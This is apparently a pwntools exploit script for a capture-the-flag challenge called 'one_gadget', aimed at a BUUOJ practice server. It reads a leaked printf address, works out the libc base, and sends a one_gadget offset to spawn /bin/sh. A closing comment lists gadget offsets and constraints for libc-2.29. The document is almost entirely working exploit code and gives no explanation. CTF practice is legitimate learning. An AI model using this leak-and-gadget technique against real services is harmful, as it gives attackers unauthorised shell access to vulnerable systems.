#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'


if(sys.argv[1] =='l'):
    p = process('./one_gadget')
    elf = ELF('./one_gadget')
    libc = ELF('./libc-2.29.so')
else:
    p = remote('node3.buuoj.cn',26576)
    elf = ELF('./one_gadget')
    libc = ELF('./libc-2.29.so')


ru('here is the gift for u:')


printf = int(rv(14),16)
libc_base = printf - libc.symbols['printf']
one_gadget = libc_base + 0x106ef8

sla('Give me your one gadget:',str(one_gadget))
ia()


'''
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''